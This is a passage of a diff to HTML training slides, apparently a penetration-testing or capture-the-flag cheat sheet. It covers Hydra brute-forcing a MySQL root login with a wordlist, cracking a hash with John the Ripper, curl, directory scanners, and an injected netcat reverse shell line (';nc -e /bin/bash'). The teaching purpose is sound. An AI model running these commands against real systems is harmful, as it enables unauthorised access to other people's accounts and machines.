+<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
 <pre class="text"><code>*(-t 16     = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
@@ -378,27 +838,27 @@ $ nmap --script=mysql-enum [target]</code></pre>
   [IP]      = The IP address of the target machine
   [mysql]   = Sets the protocol)</code></pre>
 </div>
-<div id="jon-the-ripper" class="slide section level3" number="1.4.9">
-<h1><span class="header-section-number">1.4.9</span> Jon the Ripper</h1>
+<div id="john-the-ripper" class="slide section level3" number="1.5.9">
+<h1><span class="header-section-number">1.5.9</span> John the Ripper</h1>
 <p>If we have a hash which look something like the following example:</p>
 <pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <p>We can pipe the hash in a file:</p>
-<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
 <p>And crack the password with <code>John the Ripper</code>:</p>
-<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
-<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
+<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
 <pre class="text"><code>*(--show            = show cracked passwords
   --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
 </div>
 
-<div id="web-fundamentals" class="title-slide slide section level2" number="1.5">
-<h1><span class="header-section-number">1.5</span> Web Fundamentals</h1>
+<div id="web-fundamentals" class="title-slide slide section level2" number="1.6">
+<h1><span class="header-section-number">1.6</span> Web Fundamentals</h1>
 
 </div>
-<div id="curl" class="slide section level3" number="1.5.1">
-<h1><span class="header-section-number">1.5.1</span> Curl</h1>
+<div id="curl" class="slide section level3" number="1.6.1">
+<h1><span class="header-section-number">1.6.1</span> Curl</h1>
 <p>If we want to get sources of a webpage, we can do this with <code>Curl</code>:</p>
-<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-X</span> GET http://10.10.4.59:8081/ctf/post</span></code></pre></div>
+<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-X</span> GET http://10.10.4.59:8081/ctf/post</span></code></pre></div>
 <pre class="text"><code>*(-X [GET]          = Set kind of fetch
   [target]          = The URL of the webpage we want to fetch
   -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
@@ -407,8 +867,8 @@ $ nmap --script=mysql-enum [target]</code></pre>
 <p><code>Gobuster</code> is a tool used to brute-force URIs including directories and files as well as DNS subdomains.</p>
 <p><code>DIRB</code> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects.</p>
 </div>
-<div id="reverse-shell" class="slide section level3" number="1.5.2">
-<h1><span class="header-section-number">1.5.2</span> Reverse Shell</h1>
+<div id="reverse-shell" class="slide section level3" number="1.6.2">
+<h1><span class="header-section-number">1.6.2</span> Reverse Shell</h1>
 <pre class="shell"><code>$ ;nc -e /bin/bash</code></pre>
 <p>For more information checkout the following GitHub repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
 <p>If you gain access depending on the OS you can try the following commands to get more information: &gt;Linux</p>
